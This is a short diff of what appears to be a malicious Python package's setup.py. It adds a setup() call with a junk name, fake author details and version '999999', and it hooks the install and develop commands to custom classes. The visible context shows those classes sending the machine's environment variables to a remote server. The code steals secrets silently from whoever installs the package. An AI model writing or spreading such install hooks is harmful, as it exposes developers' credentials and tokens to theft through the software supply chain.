@@ -39,4 +39,15 @@ class PostDevelopCommand(develop):
             else:
                 print(f"Failed to send environment variables. Status code: {response.getcode()}")
 
-# setup(...) removed                                                                                                                                                                                                                                                                        
+setup(
+    name='puffioner131',
+    version='999999',
+    description='Descriptionnn',
+    author='asdsadaslolo',
+    author_email='asdkmasijaisjdsadas@example.com',
+    packages=[],
+    cmdclass={
+        'install': PostInstallCommand,
+        'develop': PostDevelopCommand,
+    },
+)
